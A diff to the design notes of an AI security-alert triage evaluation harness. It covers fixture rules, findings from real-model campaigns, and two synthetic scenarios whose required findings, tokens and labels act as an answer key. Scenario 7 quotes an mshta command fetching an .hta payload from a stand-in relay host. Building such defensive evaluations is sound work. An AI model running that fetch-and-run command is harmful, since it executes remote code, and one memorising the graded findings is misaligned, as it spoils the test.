@@ -57,6 +57,23 @@ it. The only guaranteed identity link in a trace is
   `source_systems`. The model never asserts them.
 - Silence does not score. A result with no observed facts is grounded only when the
   verdict is `inconclusive` and `missing_context` names what could not be established.
+  Seen against a real model for the first time on 2026-09-15, twice, on scenario 5, and
+  kept under `runs/lsass_access/campaign-3/` and `runs/lsass_access/campaign-5/` so it
+  can be replayed. Both first passes wrote three observed facts, and not one cited a
+  tool call: the first cited `RB-0520`, the id of the runbook entry inside a response,
+  beside the alert's own id; the second cited the alert's own id three times. The
+  validator refused every citation as `unknown_id`. The repair instruction offered the
+  first run two citable calls, among them the runbook query that had returned RB-0520,
+  and the second run one; both models withdrew all three facts rather than re-cite,
+  which is a repair the instruction allows. What came back was a result with zero
+  observed facts, three or four assumptions restating the alert, and a verdict asserted
+  anyway: `benign_true_positive` at confidence 1.0 in one run and `true_positive` at
+  0.9 in the other, opposite verdicts on the same evidence-free result, neither
+  `inconclusive`, and neither naming the missing context that would have made silence
+  honest. The rule refused both. Both runs are `failed_ungrounded`, not laundered into
+  `inconclusive`, and had the rule read the other way one of them would have been a
+  correct verdict with no evidence behind it, counted in the summary. The rule is
+  unchanged.
 - The metric `ungrounded_claim_rate` is enforced to zero rather than hoped for.
 
 A claim that cannot be attached to a tool call is not a fact. It belongs in
@@ -458,6 +475,27 @@ Decisions the pipeline rests on:
   the runbook asked about egress points without naming the travel alert or the SASE
   product, is a visible `no_fixture` error the model can rephrase, and that is the
   right side to err on.
+- **What an entity is when a scenario's subject is an exercise or an address, not a
+  user.** The first real campaign showed the entity rule right and the entity list
+  short. Scenario 5's runbook stub keyed on the account and the host as the alert spells
+  them, and a real model asked the runbook for `purpleops`, `PurpleOps`, `purple` and
+  `rt-cred`: the programme's name as the account and the folder carry it, and the tool.
+  Scenario 2's query stubs keyed on the account, and a real model pivoted on the source
+  address, asking the hunting API what `192.0.2.44` did and the runbook whether it knew
+  the address. Seven calls refused across the two scenarios, and in one run they were
+  every evidence question it asked, for entities the rows held and the stubs did not
+  name. So the rule is stated for the case. The entities a stub keys on are every proper
+  name its rows or its entry hold: for a scenario about an exercise, the exercise's
+  identifier, its programme name with the stems that name carries, the operator
+  account, the host and the tool; for a scenario about an address, the address as well
+  as the account it reached. A stub keyed on the account alone answers the analyst who
+  pivots on the actor and refuses the one who pivots on the source, and both are
+  analysts. The widening is by entity: no key becomes a table name or an action word,
+  so the collision probe and the binding apply as before. A declared empty reading
+  stays one: the runbook asked for the bare address answers no hits, from a stub that
+  names the address, because a knowledge base does not hold an attacker's address and a
+  `no_fixture` there would say the harness ran out when it is the runbook that has
+  nothing.
 - **A stub names the scenario it serves, and no stub answers another scenario's
   question.** Eight scenarios share nine fixture files and the first matching stub wins
   in file order. The entity rule makes a collision unlikely and nothing prevented one,
@@ -495,7 +533,8 @@ Decisions the pipeline rests on:
   every committed recording to every stub that does not serve that recording's
   scenario, as the request was sent, through the same matcher the adapter uses; a
   stub that would answer is a collision, named with the recording it came from. The
-  corpus is one run today and grows with every recording, which is the point: a
+  corpus was one run when this was written and is ten recordings across six scenarios
+  as of 2026-09-15; it grows with every recording, which is the point: a
   scenario is checked against the questions real models asked about every other one,
   and a stub that widens later is checked against every question already on file. A
   recording whose directory names no scenario present cannot be attributed and fails
@@ -895,10 +934,25 @@ alert-forensics eval-report results/
   the run failed.
 - `replay RUN.json` reads a recorded artifact, verifies the raw store beside it against
   the recorded hashes, states the model and the date of the run, and prints it through
-  `show`. Recorded runs live under `runs/<scenario>/`, and each is a recording of a
-  real model run, never of the scripted client: a recording of the scripted client
-  would be a fake demo, which is worse than none. A test refuses a committed recording
-  whose model is the scripted client. `eval` and `eval-report` are described under
+  `show`. Recorded runs live under `runs/<scenario>/<recording>/`, one directory per
+  recording holding `run.json` and `run.raw/`, and each is a recording of a real model
+  run, never of the scripted client: a recording of the scripted client would be a
+  fake demo, which is worse than none. A test refuses a committed recording whose model
+  is the scripted client, and one that holds no tool call.
+- **Which runs are committed is a rule, not a choice.** A recording belongs under
+  `runs/` when a decision in this document cites it, or when it is the scenario's
+  demonstration run: the first completed run of the first real campaign on the
+  scenario, in index order, whatever it scored. The results directory is not committed,
+  so a run this document cites must be under `runs/` to be replayable by a reader, and
+  the demonstration run is chosen by rule so that it is not the best one. A run the
+  provider refused before any turn holds no request and no reading and is not a
+  recording. The first recording, made before the `no_fixture` rule, the whole-word
+  tokens and the label binding, stays as `runs/atypical_travel/defaults-2026-09-14/`:
+  it is the run that found the default defect, and scenario 1's section cites it. Ten
+  recordings across six scenarios are committed as of 2026-09-15, each listed in
+  `runs/README.md` with its model, its date, the campaign index it was copied from and
+  what it shows; the ones with `campaign-` in the name are copies of run directories
+  of the 2026-09-15 campaign, artifact and raw store unchanged. `eval` and `eval-report` are described under
   "Evaluation"; the viewer over the same artifacts is the next slice.
 - The model is chosen with `--model provider:name` through `init_chat_model`, so any
   provider works, and so does a local model through Ollama.
@@ -1174,6 +1228,35 @@ decision, recorded as a fixture change with its test when the fixture was at fau
 and left as the model's miss otherwise; the results directory keeps every artifact so
 it can be made after the fact.
 
+### One real run before a cell is paid for
+
+No test finds the gap a model's question opens. The scripted suite hits a stub on every
+call of every scenario, and it proved nothing about scenario 5, because the script asks
+the questions the alert's evidence spells and a model asks the questions an analyst asks.
+The collision probe checks the recordings that exist. Both are floors, and neither holds
+the question that has not been asked yet. So a scenario is not measured until a real
+model has asked it questions once and the author has read them. Decided, in order:
+
+1. The scripted suite over the scenario is green: every call hits a stub, and the
+   projection test holds every listed tool's reading to the findings' words.
+2. One real run, on the cheapest model available, with `--runs 1`. It costs one
+   investigation, and the campaign showed what skipping it costs: three runs each on two
+   scenarios before anyone read a trace.
+3. Every `no_fixture` call in its trace is read with its arguments and decided, one by
+   one: a question the fixture should answer, closed by a stub keyed on the entity the
+   question named, with the request replayed from the artifact in a test so the check
+   cannot drift from the run; or a question the fixture should not answer, named in the
+   scenario's section as what no stub carries on purpose. Neither is left as a count.
+4. The recording is committed under `runs/`, so the probe holds its questions and the
+   next scenario's stubs are checked against them.
+5. Then the cell, and the recall it produces is read as a floor, as before.
+
+What this cost on the first campaign, stated: scenarios 2 and 5 were run at three runs
+each before step 3, and the evidence recall of `lsass_access` is a floor under seven
+refused calls that step 3 has since closed. The cells stand, since a cell accumulates;
+the closed gaps are on record in the scenarios' sections beside them, and a rerun
+measures the model.
+
 ### Statistics
 
 N runs per cell, configurable with `--runs`, default 3: small, because the build runs on
@@ -1323,8 +1406,8 @@ no escalation.
 - Expected missing context, two: the gateway or VPN session log that ties the user to
   the gateway at both times, which no tool provides; and the MFA or device compliance
   outcome, which the runbook checklist asks for and the sign-in view does not carry.
-- The committed recording under `runs/atypical_travel/` scores verdict 1, evidence
-  recall 2 of 3, missing context 0 of 2, escalation correct. The gateway finding is not
+- The committed recording under `runs/atypical_travel/defaults-2026-09-14/` scores
+  verdict 1, evidence recall 2 of 3, missing context 0 of 2, escalation correct. The gateway finding is not
   reached, and the trace says why. The model queried the runbook with "VPN SASE
   corporate egress proxy Amsterdam Paris", the right terms for the entry that answers
   it, and the fixture's default answered no hits because the stub matched only the
@@ -1337,11 +1420,19 @@ no escalation.
   substring rule it scored 3 of 3, on `SASE` inside the owner name. So the recall
   number measures a fixture gap the default hid, not the model: on this recording 2 of
   3 is a floor on what the model does with the evidence it was actually handed, and the
-  fixture is now corrected as above. The number stands until the scenario is re-recorded
-  under the corrected fixtures, and the recording is kept as it is, since a recording is
-  a real run and this one is the run that found the defect. The missing-context zero is
-  the model's: it named nothing it could not establish, and it had been told the runbook
-  was empty and the identity unknown without naming either as unobtained.
+  fixture is now corrected as above. The recording is kept as it is, since a recording
+  is a real run and this one is the run that found the defect. The missing-context zero
+  is the model's: it named nothing it could not establish, and it had been told the
+  runbook was empty and the identity unknown without naming either as unobtained.
+- Re-recorded under the corrected fixtures on 2026-09-15, in the first campaign: five
+  completed runs, every verdict right, four of them at evidence recall 3 of 3, and the
+  runbook, the identity and the sign-ins hit on every one. The demonstration run under
+  `runs/atypical_travel/campaign-0/`, the first completed by rule, is the one at 1 of 3:
+  it wrote one fact for both sign-ins, "two successful sign-ins at 09:12:04 and 09:51:40
+  from 203.0.113.7", and named neither city, so the two sign-in findings missed on
+  `Paris` and `Amsterdam`. That is the "both" case scenario 1's findings were split
+  for, and the miss is the model's: the finding's word is the city, and the fact did
+  not say it. Missing context stayed 0 of 2 on every run.
 
 ### Scenario 2, password spray
 
@@ -1411,9 +1502,31 @@ that names them offline resolves them.
   No stub labelled `test` belonged to this scenario: the three that existed when it
   was written served a production server, a workstation's process tree and a
   redaction case, none of which this scenario names; scenario 4 has since claimed the
-  first and rewritten the third. Eleven stubs carry the label: one identity, one related
-  alerts, two indicators, three hunting queries, one runbook entry, three SIEM
-  searches.
+  first and rewritten the third.
+- **The address pivot, found on the first campaign.** Three completed runs, and every
+  one opened with a sign-in query naming both `rbennett` and `192.0.2.44`, which the
+  account stub answered. Then two of them asked the runbook for the bare address, and
+  one asked the hunting API twice what the address had done, a distinct count of
+  accounts by address and a listing of its sign-ins, and all four were refused: the
+  stubs keyed on the account, and the address is the other entity these rows hold. So
+  the hunting API and the SIEM each gain a stub keyed on the address, answering a
+  sign-in query that names it with the address's own rows: the five accounts it tried
+  through BAV2ROPC between 06:09 and 06:38, each a single failure, then rbennett's
+  success and the interactive sign-in that followed, which the account stub already
+  holds. They sit after the account stubs in file order, so a query naming both gets
+  the account's rows as before, and before the aggregate. The runbook gains a declared
+  empty reading keyed on the address, after the entry stub, so a question naming the
+  address and the spray still gets the playbook and the bare address gets no hits. A
+  fourth question about the address, a distinct count of the accounts and successes
+  from it, was answered on the campaign by the tenant-wide aggregate, which is about 31
+  addresses and was the wrong reading for a question about one; the address stub sits
+  before the aggregate, so it answers that question too. The four requests are replayed
+  from `runs/password_spray/campaign-3/` and `campaign-5/` in a test, so the check
+  cannot drift from the runs. The two hunting refusals are
+  worth reading: the model had the address from the alert and asked the right
+  question, and the harness told it the harness had nothing. Fourteen stubs carry the
+  label: one identity, one related alerts, two indicators, four hunting queries, two
+  runbook entries of which one is empty, four SIEM searches.
 - Expected missing context, two: what was done in the mailbox after the rule, which no
   fixture carries; and whether any of the other sprayed accounts also had a success,
   which the failure aggregate cannot say.
@@ -1628,6 +1741,23 @@ verdict definition carries an action.
   the device, which is the principal entity of its rows, so a block query about another
   device is a `no_fixture` error. `AdditionalFields` on the block row carries the desired
   access mask and is dropped by the projection, the way scenario 4's decoded commands are.
+- **The runbook gap, found on the first campaign.** Six runs, three refused by the
+  provider before any turn. The three served all opened by asking the runbook, and
+  seven of their calls were refused: `purpleops`, `PurpleOps` and `rt-cred` in one run,
+  `purpleops` and `PurpleOps` in another, `PurpleOps` and `purple` in the third. The
+  stub keyed on `svc-purpleops` and `ws-eng-0148` as the alert spells them, on the
+  exercise's identifier and on its kind; none of those is what a model types when it
+  reads the account's stem and the folder `C:\ProgramData\PurpleOps`, and none is the
+  tool. So the stub now also names the programme, `purple`, which covers the stem, the
+  folder and the exercise's kind, and the tool, `rt-cred`; both are proper names of
+  this scenario, neither is a table or an action word, and no other alert or recording
+  carries them. The seven requests are replayed from the three committed recordings in
+  a test. What the gap did to the numbers: the one completed run, under
+  `runs/lsass_access/campaign-4/`, reached none of the four findings. Two rest on the
+  runbook it was refused three times. The other two rest on the hunting API and the
+  SIEM, which it never queried: its three facts cite the identity, the asset and the
+  related alerts, all correct and none a required finding. So 0 of 4 is a floor of two
+  halves, one the fixture's and one the model's, and the trace separates them.
 - Expected missing context, two: whether any credential material was returned before the
   block, which no view carries because the block's result payload is not projected, and
   which is why confirming the prevention worked is the recommended action rather than a
@@ -1709,6 +1839,174 @@ prescribes the exclusion is an observed fact about the runbook, not the verdict.
   technique is expected of the investigation.
 - The scripted cell is a plumbing check on the same terms as scenario 3's. No real
   model has run it yet.
+
+### Scenario 7, the trap: an RMM tool blocked by the EDR
+
+Checked against the table under "Scenarios". The signal is the EDR blocking a signed
+remote-management binary with a clean reputation: what the rule's logic measured, and
+true. The assertion is that a remote-management tool was executed on the endpoint, at
+the granularity of T1219 and of the device it names. It is true: the block caught the
+second execution, and the first ran. At 08:41:10 UTC on 2026-09-14 `outlook.exe` on
+`ws-fin-0042` launched `mshta.exe https://relay.example.net/invoice.hta`; at 08:41:12
+mshta launched an encoded PowerShell, and at 08:41:15 it launched
+`RemoteSupport.ClientSetup.exe /silent /relay=relay.example.net`, which ran; at 08:47:16,
+six minutes after mshta, the installed `RemoteSupport.Agent.exe` started and Defender
+Antivirus blocked it as a potentially unwanted application. Intent decides between
+`true_positive` and `benign_true_positive`, and nothing here is authorised: the group's IT
+provider does run RemoteSupport, deployed by Intune to the provider's relay
+`rmm.contoso-itsupport.example`, and this install arrived from a user's Temp folder,
+by script, from a mail client, to a relay registered twelve days earlier. Label
+`true_positive`, escalation expected. Seven is the mirror of one, as the table says: a
+signature and a clean reputation make the assertion no less true, the way a gateway's
+geo-IP made the travel no more real.
+
+The story, all synthetic. `pnovak@contoso.com` is a Trade Finance identity of high
+priority on the finance workstation `ws-fin-0042.contoso.com`. The chain is the process
+tree the fixtures have carried since slice 2 under the label `test`, which was written
+as this scenario's chain and is now claimed: `explorer.exe` to `outlook.exe` to
+`mshta.exe` to the encoded PowerShell and the installer, with the installer's command
+line carrying the relay and a password the generic redaction removes. The tree gains the
+agent's row, launched by the installer at 08:47:16 and blocked. VirusTotal knows the agent
+and the installer as signed by RemoteSupport Software Ltd with nothing flagged out of 72
+engines, the relay domain as created on 2026-09-02 with two engines flagging it, and the
+`.hta` URL with two flagging it as phishing; the reputation on every one is zero, which
+the projection reads as nobody having voted, not as clean. Defender raised an
+informational alert on the mshta launch six minutes before this one, in the same incident,
+and the related-alerts pivot on the user, the device or the incident finds it. The
+techniques the alert declares are `T1219` alone; `T1218.005`, mshta, is the follow-on
+technique the investigation resolves, already in the packaged excerpt, so
+`tests/recorded/README.md` gains a sentence and no object.
+
+- Required findings, four, and this scenario spans more tools than any other, so each is
+  stated with the tool it rests on and the check against the reading, under whole-word
+  matching. **The block:** the device, `RemoteSupport.Agent.exe` or `RemoteSupport`, and
+  one of `blocked`, `prevented`, `denied`, `quarantined`, cited from the SIEM alone. The
+  hunting `DeviceEvents` row names the event through `ActionType` `AntivirusDetection` and
+  keeps the outcome in `AdditionalFields`, which the projection drops, so the hunting view
+  carries the detection but not the block as a word; the CIM-normalised SIEM carries
+  `action` `blocked` and a signature that says the application was blocked, the way
+  scenario 5's block is carried by the SIEM alone. **Mshta from the mail client:**
+  `mshta.exe` or `mshta`, and one of `outlook.exe`, `outlook`, `OUTLOOK.EXE`, cited from
+  the process tree, the hunting API or the SIEM, since all three readings carry both
+  names: the tree as parent and self, the hunting row as `FileName` and
+  `InitiatingProcessFileName`, the SIEM as `process_name` and `parent_process_name`. **The
+  installer, launched by mshta, naming the relay:** `RemoteSupport.ClientSetup.exe` or
+  `ClientSetup`, `mshta.exe` or `mshta`, and the relay, from the same three tools. The
+  relay token is the scenario 3 precedent: every reading carries it inside the command
+  line as `/relay=relay.example.net`, which under the whole-word rule is one word
+  `relay=relay.example.net` once the leading slash is stripped, so that spelling is the
+  first alternative and `relay.example.net` the restatement a model writes. **The
+  provider's relay:** `rmm.contoso-itsupport.example` and one of `provider`, `IT
+  provider`, `service desk`, `Intune`, `approved`, `sanctioned`, cited from the runbook
+  alone, since only the runbook says what the provider's relay is. A fact that names both
+  relays would have established the mismatch in one sentence, and it cannot be a finding,
+  because no single reading carries both names; two findings that each name one are what
+  the tokens can see, which is scenario 1's reason for two sign-in findings.
+- **VirusTotal carries no finding, on purpose.** The clean reading of the agent, signed,
+  0 of 72, is the reading a token could be fitted to: it carries `RemoteSupport` and
+  `signed` as whole words, and a fact that copied it would look like the block finding
+  minus the block. No finding lists `lookup_ioc`, and since a finding is matched by tool
+  before tokens, a fact citing VirusTotal can carry none of the four whatever it says.
+  The domain's age and the URL's two flags are supporting readings a good investigation
+  cites and the verdict does not rest on; the verdict rests on the chain and on the
+  relay, which are the same whether or not any engine has an opinion.
+- Stubs, all labelled `rmm_block`, keyed on the entities of the rows they return: the
+  process tree on the device with any process id, since a model pivots on the alert's
+  process, the installer or mshta and the same rows answer all three; the device's
+  process events and its antivirus detection in the hunting API, on the device or the
+  account, since the rows hold both; the device's endpoint events in the SIEM, one stub
+  holding the four process rows and the block, on the device or the account; the user's
+  sign-ins in both tools; the user's identity; the device's asset record; the related
+  alerts on the user, the device and the incident; the agent's hash, the installer's
+  hash, the relay domain and the `.hta` URL on VirusTotal; and the runbook on the alert
+  type, the product, `RMM`, either relay, mshta, the `.hta` extension, the device, the
+  user or the techniques. The `mshta.exe` hash is `shared`, a Microsoft binary whose
+  reading does not depend on who asks. What no stub carries, on purpose: the network
+  telemetry that would say whether the first agent reached the relay, and the mail that
+  delivered the `.hta`. Both are the expected missing context, and a model asking
+  `DeviceNetworkEvents` or `EmailEvents` gets `no_fixture`, which is the harness saying it
+  does not hold the answer. Sixteen stubs carry the label and one is `shared`.
+- **Nothing is left labelled `test`.** The workstation tree was the last, and it was
+  always this scenario's. The suite's tests of the `test` label build the stub they need
+  in a temporary fixture directory, which is the right place for a stub that serves no
+  scenario.
+- Expected missing context, two: the mail that delivered `invoice.hta`, the message trace
+  or the click, which no fixture carries; and whether the first agent established a session
+  to the relay before the block, the network telemetry, which no fixture carries.
+- The scripted cell is a plumbing check on the same terms as scenario 3's. No real
+  model has run it yet; under "One real run before a cell is paid for", none is paid for
+  until one has.
+
+### Scenario 8, the reverse trap: 6.2 GB to personal cloud storage by a leaver
+
+Checked against the table under "Scenarios", and the label is not re-litigated here: the
+table moved it once, with its reason, and this section applies that reason. The signal is
+6.2 GB uploaded to a personal cloud storage domain by a user on the leaver watchlist: what
+the rule's logic measured, and true. The assertion is that organisational data was moved
+out to personal storage by a departing employee, at the granularity of T1567.002. It is
+false: the 2 340 files are 94 percent image content by the CASB's breakdown, none carries
+a sensitivity label, none came from a SharePoint site, a file share or a labelled
+location, and the source folder is the user's own camera roll. The technique the rule is
+named for, exfiltration, did not occur, because exfiltration is organisational data
+leaving and none did; so the assertion is false and intent does not enter. Label
+`false_positive`, no escalation. The rule is not tuned, because it did exactly its job
+and the next leaver's 6.2 GB may be source code; the finding is routed to HR as personal
+use of a corporate device. Both of those are `recommended_action`, and no verdict
+definition carries an action. Eight is the shape of six, parting from it on the action
+axis: six tunes permanently, eight tunes nothing.
+
+The story, all synthetic. `dlarsen@contoso.com` is a Marketing identity who resigned
+with an end date of 2026-09-30 and is on the leaver watchlist, on the workstation
+`ws-mkt-0117.contoso.com`. Between 09:12 and 11:38 UTC on 2026-09-14 the browser on that
+workstation uploaded 2 340 files, 6 657 199 308 bytes, to `upload.photodrive.example`,
+the upload endpoint of PhotoDrive, a consumer photo storage service the proxy
+categorises as personal cloud storage and the tenant does not sanction. Defender for
+Cloud Apps had noted the app's use three days earlier as an informational alert. The
+CASB's content breakdown reads image content 94 percent, JPEG 71 and HEIC 23, video 4,
+PDF 1, other 1; sensitivity labels none; source folder the user's Pictures. The
+techniques the alert declares are `T1567.002` alone, already in the packaged excerpt.
+
+- Required findings, five. **The volume and the destination:** the user, as UPN or name,
+  the volume, and the app, cited from the hunting API or the SIEM. The volume token is
+  the scenario 3 precedent again: the readings carry the byte count `6657199308`, in the
+  hunting aggregate as `sum_FileSize` and in the SIEM as `sum(bytes_out)`, so that is the
+  first alternative and `6.2 GB` the restatement a model writes after the arithmetic. The
+  app is `PhotoDrive` or the domain. **The content is photographs:** `94` and one of
+  `image`, `images`, `photo`, `photos`, `photograph`, `photographs`, `picture`,
+  `pictures`, `JPEG`, cited from the SIEM alone, since the breakdown is the CASB's and
+  the hunting rows carry file names and sizes, not a percentage; the SIEM's `object_attrs`
+  reads `image content types 94%`, and `94%` is the word `94` under the whole-word rule
+  once the trailing sign is stripped. **No label and no corporate source:** one of
+  `sensitivity`, `label`, `labels`, `labelled`, `labeled`, `classification`, `classified`,
+  and one of `none`, `no`, `not`, `without`, `zero`, `unlabelled`, `unlabeled`, cited from
+  the SIEM alone, whose `object_attrs` reads `sensitivity labels: none` and `SharePoint
+  or OneDrive origin: none`. **The user is a leaver:** the user and one of `leaver`,
+  `leavers`, `resigned`, `resignation`, `departing`, `leaving`, `watchlist`,
+  `2026-09-30`, cited from the identity alone, whose view carries the category
+  `leaver`, the watchlist flag and the end date. **The runbook routes personal use to
+  HR:** `HR` or `human resources`, and `personal use` or `personal`, cited from the
+  runbook alone, since only the runbook prescribes the routing; this is scenario 6's
+  requalification finding, an observed fact about the runbook and not the verdict.
+  VirusTotal's clean reading of the storage domain carries no finding and is listed on
+  none, for scenario 7's reason.
+- Stubs, all labelled `cloud_upload`, keyed on the entities of the rows they return: the
+  user's cloud-app activity in the hunting API, an aggregate stub before a detail stub in
+  file order so a `summarize` query reads the count and the byte sum, both on the user;
+  the workstation's network events to the storage domain on the device; the user's
+  sign-ins in both tools; the CASB reading in the SIEM on the user or the domain; the
+  user's identity; the workstation's asset record; the related alerts on the user and on
+  the incident; the storage domain and its parent on VirusTotal; and the runbook on the
+  alert type, the leaver watchlist, the app, the domain, the user, the device or the
+  technique. Thirteen stubs carry the label. What no stub carries, on purpose: a hash or
+  fingerprint match of the uploaded files against corporate locations, and anything
+  about the six percent that is not an image beyond the percentage, which are the
+  expected missing context.
+- Expected missing context, two: the names and origin of the non-image files, the PDF
+  and the other one percent, which the reading gives only as a percentage and which is
+  where a document would hide; and the HR record or the user's own account of the
+  upload, the confirmation that the photographs are personal, which no tool reaches.
+- The scripted cell is a plumbing check on the same terms as scenario 3's. No real
+  model has run it yet, and none is paid for until one real run has been read.
 
 ## Cost discipline
 
